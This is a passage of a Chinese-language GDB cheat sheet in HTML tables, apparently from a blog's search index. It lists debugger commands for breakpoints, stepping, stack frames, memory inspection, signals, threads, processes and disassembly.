<td>禁用某断点，但是部删除</td>
<td></td>
</tr>
<tr>
<td><code>enable 2</code></td>
<td>允许某个之前被禁用的断点，让它生效</td>
<td></td>
</tr>
<tr>
<td><code>rbreak &#123;regexpr&#125;</code></td>
<td>匹配正则的函数前断点，如 <code>ex_*</code> 将断点 ex_ 开头的函数</td>
<td></td>
</tr>
<tr>
<td><code>tbreak function/line</code></td>
<td>临时断点</td>
<td></td>
</tr>
<tr>
<td><code>hbreak function/line</code></td>
<td>硬件断点</td>
<td></td>
</tr>
<tr>
<td><code>ignore &#123;id&#125; &#123;count&#125;</code></td>
<td>忽略某断点 N-1 次</td>
<td></td>
</tr>
<tr>
<td><code>condition &#123;id&#125; &#123;expr&#125;</code></td>
<td>条件断点，只有在条件生效时才发生</td>
<td></td>
</tr>
<tr>
<td><code>condition 2 i == 20</code></td>
<td>2号断点只有在 i == 20 条件为真时才生效</td>
<td></td>
</tr>
<tr>
<td><code>watch &#123;expr&#125;</code></td>
<td>对变量设置监视点</td>
<td></td>
</tr>
<tr>
<td><code>info watchpoints</code></td>
<td>显示所有观察点</td>
<td></td>
</tr>
<tr>
<td><code>catch exec</code></td>
<td>断点在exec事件，即子进程的入口地址</td>
<td></td>
</tr>
</tbody></table>
<h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>run</code></td>
<td>运行程序</td>
<td></td>
</tr>
<tr>
<td><code>run &#123;args&#125;</code></td>
<td>以某参数运行程序</td>
<td></td>
</tr>
<tr>
<td><code>run &lt; file</code></td>
<td>以某文件为标准输入运行程序</td>
<td></td>
</tr>
<tr>
<td><code>run &lt; &lt;(cmd)</code></td>
<td>以某命令的输出作为标准输入运行程序</td>
<td></td>
</tr>
<tr>
<td><code>run &lt;&lt;&lt; $(cmd)</code></td>
<td>以某命令的输出作为标准输入运行程序</td>
<td>Here-String</td>
</tr>
<tr>
<td><code>set args &#123;args&#125; ...</code></td>
<td>设置运行的参数</td>
<td></td>
</tr>
<tr>
<td><code>show args</code></td>
<td>显示当前的运行参数</td>
<td></td>
</tr>
<tr>
<td><code>cont</code></td>
<td>继续运行，可简写为 c</td>
<td></td>
</tr>
<tr>
<td><code>step</code></td>
<td>单步进入，碰到函数会进去</td>
<td></td>
</tr>
<tr>
<td><code>step &#123;count&#125;</code></td>
<td>单步多少次</td>
<td></td>
</tr>
<tr>
<td><code>next</code></td>
<td>单步跳过，碰到函数不会进入</td>
<td></td>
</tr>
<tr>
<td><code>next &#123;count&#125;</code></td>
<td>单步多少次</td>
<td></td>
</tr>
<tr>
<td><code>CTRL+C</code></td>
<td>发送 SIGINT 信号，中止当前运行的程序</td>
<td></td>
</tr>
<tr>
<td><code>attach &#123;process-id&#125;</code></td>
<td>链接上当前正在运行的进程，开始调试</td>
<td></td>
</tr>
<tr>
<td><code>detach</code></td>
<td>断开进程链接</td>
<td></td>
</tr>
<tr>
<td><code>finish</code></td>
<td>结束当前函数的运行</td>
<td></td>
</tr>
<tr>
<td><code>until</code></td>
<td>持续执行直到代码行号大于当前行号（跳出循环）</td>
<td></td>
</tr>
<tr>
<td><code>until &#123;line&#125;</code></td>
<td>持续执行直到执行到某行</td>
<td></td>
</tr>
<tr>
<td><code>kill</code></td>
<td>杀死当前运行的函数</td>
<td></td>
</tr>
</tbody></table>
<h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>bt</code></td>
<td>打印 backtrace</td>
<td></td>
</tr>
<tr>
<td><code>frame</code></td>
<td>显示当前运行的栈帧</td>
<td></td>
</tr>
<tr>
<td><code>up</code></td>
<td>向上移动栈帧（向着 main 函数）</td>
<td></td>
</tr>
<tr>
<td><code>down</code></td>
<td>向下移动栈帧（远离 main 函数）</td>
<td></td>
</tr>
<tr>
<td><code>info locals</code></td>
<td>打印帧内的相关变量</td>
<td></td>
</tr>
<tr>
<td><code>info args</code></td>
<td>打印函数的参数</td>
<td></td>
</tr>
</tbody></table>
<h2 id="代码浏览"><a href="#代码浏览" class="headerlink" title="代码浏览"></a>代码浏览</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>list 101</code></td>
<td>显示第 101 行周围 10行代码</td>
<td></td>
</tr>
<tr>
<td><code>list 1,10</code></td>
<td>显示 1 到 10 行代码</td>
<td></td>
</tr>
<tr>
<td><code>list main</code></td>
<td>显示函数周围代码</td>
<td></td>
</tr>
<tr>
<td><code>list basic.c:main</code></td>
<td>显示另外一个源代码文件的函数周围代码</td>
<td></td>
</tr>
<tr>
<td><code>list -</code></td>
<td>重复之前 10 行代码</td>
<td></td>
</tr>
<tr>
<td><code>list *0x22e4</code></td>
<td>显示特定地址的代码</td>
<td></td>
</tr>
<tr>
<td><code>cd dir</code></td>
<td>切换当前目录</td>
<td></td>
</tr>
<tr>
<td><code>pwd</code></td>
<td>显示当前目录</td>
<td></td>
</tr>
<tr>
<td><code>search &#123;regexpr&#125;</code></td>
<td>向前进行正则搜索</td>
<td></td>
</tr>
<tr>
<td><code>reverse-search &#123;regexp&#125;</code></td>
<td>向后进行正则搜索</td>
<td></td>
</tr>
<tr>
<td><code>dir &#123;dirname&#125;</code></td>
<td>增加源代码搜索路径</td>
<td></td>
</tr>
<tr>
<td><code>dir</code></td>
<td>复位源代码搜索路径（清空）</td>
<td></td>
</tr>
<tr>
<td><code>show directories</code></td>
<td>显示源代码路径</td>
<td></td>
</tr>
</tbody></table>
<h2 id="浏览数据"><a href="#浏览数据" class="headerlink" title="浏览数据"></a>浏览数据</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>print &#123;expression&#125;</code></td>
<td>打印表达式，并且增加到打印历史</td>
<td></td>
</tr>
<tr>
<td><code>print /x &#123;expression&#125;</code></td>
<td>十六进制输出，print 可以简写为 p</td>
<td></td>
</tr>
<tr>
<td><code>print array[i]@count</code></td>
<td>打印数组范围</td>
<td></td>
</tr>
<tr>
<td><code>print $</code></td>
<td>打印之前的变量</td>
<td></td>
</tr>
<tr>
<td><code>print *$-&gt;next</code></td>
<td>打印 list</td>
<td></td>
</tr>
<tr>
<td><code>print $1</code></td>
<td>输出打印历史里第一条</td>
<td></td>
</tr>
<tr>
<td><code>print ::gx</code></td>
<td>将变量可视范围（scope）设置为全局</td>
<td></td>
</tr>
<tr>
<td><code>print &#39;basic.c&#39;::gx</code></td>
<td>打印某源代码里的全局变量，(gdb 4.6)</td>
<td></td>
</tr>
<tr>
<td><code>print /x &amp;main</code></td>
<td>打印函数地址</td>
<td></td>
</tr>
<tr>
<td><code>x *0x11223344</code></td>
<td>显示给定地址的内存数据</td>
<td></td>
</tr>
<tr>
<td><code>x /nfu &#123;address&#125;</code></td>
<td>打印内存数据，n是多少个，f是格式，u是单位大小</td>
<td></td>
</tr>
<tr>
<td><code>x /10xb *0x11223344</code></td>
<td>按十六进制打印内存地址 0x11223344 处的十个字节</td>
<td></td>
</tr>
<tr>
<td><code>x/x &amp;gx</code></td>
<td>按十六进制打印变量 gx，x和斜杆后参数可以连写</td>
<td></td>
</tr>
<tr>
<td><code>x/4wx &amp;main</code></td>
<td>按十六进制打印位于 main 函数开头的四个 long</td>
<td></td>
</tr>
<tr>
<td><code>x/gf &amp;gd1</code></td>
<td>打印 double 类型</td>
<td></td>
</tr>
<tr>
<td><code>help x</code></td>
<td>查看关于 x 命令的帮助</td>
<td></td>
</tr>
<tr>
<td><code>info locals</code></td>
<td>打印本地局部变量</td>
<td></td>
</tr>
<tr>
<td><code>info functions &#123;regexp&#125;</code></td>
<td>打印函数名称</td>
<td></td>
</tr>
<tr>
<td><code>info variables &#123;regexp&#125;</code></td>
<td>打印全局变量名称</td>
<td></td>
</tr>
<tr>
<td><code>ptype name</code></td>
<td>查看类型定义，比如 ptype FILE，查看 FILE 结构体定义</td>
<td></td>
</tr>
<tr>
<td><code>whatis &#123;expression&#125;</code></td>
<td>查看表达式的类型</td>
<td></td>
</tr>
<tr>
<td><code>set var = &#123;expression&#125;</code></td>
<td>变量赋值</td>
<td></td>
</tr>
<tr>
<td><code>display &#123;expression&#125;</code></td>
<td>在单步指令后查看某表达式的值</td>
<td></td>
</tr>
<tr>
<td><code>undisplay</code></td>
<td>删除单步后对某些值的监控</td>
<td></td>
</tr>
<tr>
<td><code>info display</code></td>
<td>显示监视的表达式</td>
<td></td>
</tr>
<tr>
<td><code>show values</code></td>
<td>查看记录到打印历史中的变量的值 (gdb 4.0)</td>
<td></td>
</tr>
<tr>
<td><code>info history</code></td>
<td>查看打印历史的帮助 (gdb 3.5)</td>
<td></td>
</tr>
</tbody></table>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>file &#123;object&#125;</code></td>
<td>加载新的可执行文件供调试</td>
<td></td>
</tr>
<tr>
<td><code>file</code></td>
<td>放弃可执行和符号表信息</td>
<td></td>
</tr>
<tr>
<td><code>symbol-file &#123;object&#125;</code></td>
<td>仅加载符号表</td>
<td></td>
</tr>
<tr>
<td><code>exec-file &#123;object&#125;</code></td>
<td>指定用于调试的可执行文件（非符号表）</td>
<td></td>
</tr>
<tr>
<td><code>core-file &#123;core&#125;</code></td>
<td>加载 core 用于分析</td>
<td></td>
</tr>
</tbody></table>
<h2 id="信号控制"><a href="#信号控制" class="headerlink" title="信号控制"></a>信号控制</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>info signals</code></td>
<td>打印信号设置</td>
<td></td>
</tr>
<tr>
<td><code>handle &#123;signo&#125; &#123;actions&#125;</code></td>
<td>设置信号的调试行为</td>
<td></td>
</tr>
<tr>
<td><code>handle INT print</code></td>
<td>信号发生时打印信息</td>
<td></td>
</tr>
<tr>
<td><code>handle INT noprint</code></td>
<td>信号发生时不打印信息</td>
<td></td>
</tr>
<tr>
<td><code>handle INT stop</code></td>
<td>信号发生时中止被调试程序</td>
<td></td>
</tr>
<tr>
<td><code>handle INT nostop</code></td>
<td>信号发生时不中止被调试程序</td>
<td></td>
</tr>
<tr>
<td><code>handle INT pass</code></td>
<td>调试器接获信号，不让程序知道</td>
<td></td>
</tr>
<tr>
<td><code>handle INT nopass</code></td>
<td>调试起不接获信号</td>
<td></td>
</tr>
<tr>
<td><code>signal signo</code></td>
<td>继续并将信号转移给程序</td>
<td></td>
</tr>
<tr>
<td><code>signal 0</code></td>
<td>继续但不把信号给程序</td>
<td></td>
</tr>
</tbody></table>
<h2 id="线程调试"><a href="#线程调试" class="headerlink" title="线程调试"></a>线程调试</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>info threads</code></td>
<td>查看当前线程和 id</td>
<td></td>
</tr>
<tr>
<td><code>thread &#123;id&#125;</code></td>
<td>切换当前调试线程为指定 id 的线程</td>
<td></td>
</tr>
<tr>
<td><code>break &#123;line&#125; thread all</code></td>
<td>所有线程在指定行号处设置断点</td>
<td></td>
</tr>
<tr>
<td><code>thread apply &#123;id..&#125; cmd</code></td>
<td>指定多个线程共同执行 gdb 命令</td>
<td></td>
</tr>
<tr>
<td><code>thread apply all cmd</code></td>
<td>所有线程共同执行 gdb 命令</td>
<td></td>
</tr>
<tr>
<td><code>set schedule-locking ?</code></td>
<td>调试一个线程时，其他线程是否执行</td>
<td></td>
</tr>
<tr>
<td><code>set non-stop on/off</code></td>
<td>调试一个线程时，其他线程是否运行</td>
<td></td>
</tr>
<tr>
<td><code>set pagination on/off</code></td>
<td>调试一个线程时，分页是否停止</td>
<td></td>
</tr>
<tr>
<td><code>set target-async on/off</code></td>
<td>同步或者异步调试，是否等待线程中止的信息</td>
<td></td>
</tr>
</tbody></table>
<h2 id="进程调试"><a href="#进程调试" class="headerlink" title="进程调试"></a>进程调试</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>info inferiors</code></td>
<td>查看当前进程和 id</td>
<td></td>
</tr>
<tr>
<td><code>inferior &#123;id&#125;</code></td>
<td>切换某个进程</td>
<td></td>
</tr>
<tr>
<td><code>kill inferior &#123;id...&#125;</code></td>
<td>杀死某个进程</td>
<td></td>
</tr>
<tr>
<td><code>set detach-on-fork on/off</code></td>
<td>设置当进程调用fork时gdb是否同时调试父子进程</td>
<td></td>
</tr>
<tr>
<td><code>set follow-fork-mode parent/child</code></td>
<td>设置当进程调用fork时是否进入子进程</td>
<td></td>
</tr>
</tbody></table>
<h2 id="汇编调试"><a href="#汇编调试" class="headerlink" title="汇编调试"></a>汇编调试</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>info registers</code></td>
<td>打印普通寄存器</td>
<td></td>
</tr>
<tr>
<td><code>info all-registers</code></td>
<td>打印所有寄存器</td>
<td></td>
</tr>
<tr>
<td><code>print/x $pc</code></td>
<td>打印单个寄存器</td>
<td></td>
</tr>
<tr>
<td><code>stepi</code></td>
<td>指令级别单步进入</td>
<td>si</td>
</tr>
<tr>
<td><code>nexti</code></td>
<td>指令级别单步跳过</td>
<td>ni</td>
</tr>
<tr>
<td><code>display/i $pc</code></td>
<td>监控寄存器（每条单步完以后会自动打印值）</td>
<td></td>
</tr>
<tr>
<td><code>x/x &amp;gx</code></td>
<td>十六进制打印变量</td>
<td></td>
</tr>
<tr>
<td><code>info line 22</code></td>
<td>打印行号为 22 的内存地址信息</td>
<td></td>
</tr>
<tr>
<td><code>info line *0x2c4e</code></td>
<td>打印给定内存地址对应的源代码和行号信息</td>
<td></td>
</tr>
<tr>
<td><code>disassemble &#123;addr&#125;</code></td>
<td>对地址进行反汇编，比如 disassemble 0x2c4e</td>
<td></td>
</tr>
</tbody></table>
<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>show commands</code></td>
<td>显示历史命令 (gdb 4.0)</td>
<td></td>
</tr>
<tr>
<td><code>info editing</code></td>
<td>显示历史命令 (gdb 3.5)</td>
<td></td>
</tr>
<tr>
<td><code>ESC-CTRL-J</code></td>
<td>切换到 Vi 命令行编辑模式</td>
<td></td>
</tr>
<tr>
<td><code>set history expansion on</code></td>
<td>允许类 c-shell 的历史</td>
<td></td>
</tr>
<tr>
<td><code>break class::member</code></td>
<td>在类成员处设置断点</td>
<td></td>
</tr>
<tr>
<td><code>list class:member</code></td>
<td>显示类成员代码</td>
<td></td>
</tr>
<tr>
<td><code>ptype class</code></td>
<td>查看类包含的成员</td>
<td>/o可以看成员偏移，类似pahole</td>
</tr>
<tr>
<td><code>print *this</code></td>
<td>查看 this 指针</td>
<td></td>
</tr>
<tr>
<td><code>define command ... end</code></td>
<td>定义用户命令</td>
<td></td>
</tr>
<tr>
<td><code>&lt;return&gt;</code></td>
<td>直接按回车执行上一条指令</td>
<td></td>
</tr>
<tr>
<td><code>shell &#123;command&#125; [args]</code></td>
<td>执行 shell 命令</td>
<td></td>
</tr>
<tr>
<td><code>source &#123;file&#125;</code></td>
<td>从文件加载 gdb 命令</td>
<td></td>
</tr>
<tr>
<td><code>quit</code></td>
<td>退出 gdb</td>
<td></td>
</tr>
</tbody></table>
]]></content>
  </entry>
</search>
